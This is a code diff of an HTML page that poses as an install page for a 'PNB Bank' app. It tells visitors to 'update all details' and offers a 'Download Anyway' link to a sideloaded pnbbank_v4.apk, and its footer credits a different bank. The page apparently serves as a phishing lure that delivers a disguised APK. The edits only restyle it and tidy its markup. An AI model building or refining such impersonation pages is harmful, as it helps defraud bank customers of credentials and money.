@@ -9,15 +9,15 @@
         body {
             font-family: Arial, sans-serif;
             padding: 20px;
-            background: linear-gradient(120deg, #f4f4f4, #e2e2e2);
-            color: #333;
+            background: #A20E37; /* Background color for the entire body */
+            color: #333; /* Default text color */
             text-align: center;
         }
         .container {
             max-width: 500px;
             margin: auto;
             padding: 30px;
-            background: #A20E37;
+            background: white; /* Changed container background color to white */
             border-radius: 10px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
         }
@@ -27,7 +27,7 @@
             margin-bottom: 20px;
         }
         h1 {
-            color: #FFFF00;
+            color: #A20E37; /* Title color to match the body background */
             font-size: 24px;
             margin-bottom: 10px;
         }
@@ -35,13 +35,14 @@
             font-size: 16px;
             margin-bottom: 15px;
             line-height: 1.5;
+            color: #333; /* Text color for paragraphs */
         }
         button {
             padding: 10px 20px;
             font-size: 16px;
             cursor: pointer;
-            background-color: #007BFF; /* Primary color */
-            color: white;
+            background-color: #007BFF; /* Primary color for the button */
+            color: white; /* Button text color */
             border: none;
             border-radius: 5px;
             transition: background-color 0.3s, transform 0.3s;
@@ -53,25 +54,25 @@
         footer {
             margin-top: 20px;
             font-size: 14px;
-            color: #666;
+            color: #666; /* Footer text color */
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Install the PNB Bank App</h1>
-        <img src="pnb01.png" alt="pnb Bank Logo">
+        <img src="pnb01.png" alt="PNB Bank Logo - Download App">
         
         <p><strong>Version:</strong> 1.0.0</p>
         <p><strong>File Size:</strong> 5 MB</p>
         <p>Click the button below to download the app and update all details:</p>
         
         <a href="pnbbank_v4.apk" download>
-            <button><i class="fas fa-download"></i> Download Anyway</button>
+            <button aria-label="Download PNB Bank App"><i class="fas fa-download"></i> Download Anyway</button>
         </a>
         
         <footer>
-            &copy; 2025 UCO Bank. All rights reserved.
+            &copy; <script>document.write(new Date().getFullYear());</script> UCO Bank. All rights reserved.
         </footer>
     </div>
 </body>
